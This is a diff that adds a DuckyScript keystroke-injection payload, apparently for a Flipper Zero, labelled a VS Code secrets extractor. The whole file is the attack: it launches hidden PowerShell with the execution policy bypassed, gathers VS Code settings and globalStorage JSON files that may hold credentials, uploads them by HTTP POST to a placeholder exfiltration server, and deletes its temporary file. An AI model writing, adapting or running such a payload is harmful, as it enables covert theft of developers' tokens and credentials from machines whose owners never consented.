@@ -1,0 +1,17 @@
+REM ===============================================================
+REM VS Code Secrets Extractor - NullSec Flipper Suite
+REM Extracts VS Code settings, extensions, and stored credentials
+REM ===============================================================
+REM Target: Windows/Linux/macOS
+REM Author: bad-antics
+REM ===============================================================
+
+GUI r
+DELAY 200
+STRING powershell -w hidden -ep bypass
+ENTER
+DELAY 500
+STRING $vsc = "$env:APPDATA\Code\User"; $secrets = @(); if(Test-Path "$vsc\settings.json"){$secrets += Get-Content "$vsc\settings.json"}; if(Test-Path "$vsc\keybindings.json"){$secrets += Get-Content "$vsc\keybindings.json"}; Get-ChildItem "$vsc\globalStorage" -Recurse -Filter "*.json" | ForEach-Object{$secrets += Get-Content $_.FullName}; $secrets | Out-File "$env:TEMP\vsc.txt"; Invoke-WebRequest -Uri "http://EXFIL_SERVER/vscode" -Method POST -Body (Get-Content "$env:TEMP\vsc.txt" -Raw); Remove-Item "$env:TEMP\vsc.txt"
+ENTER
+STRING exit
+ENTER
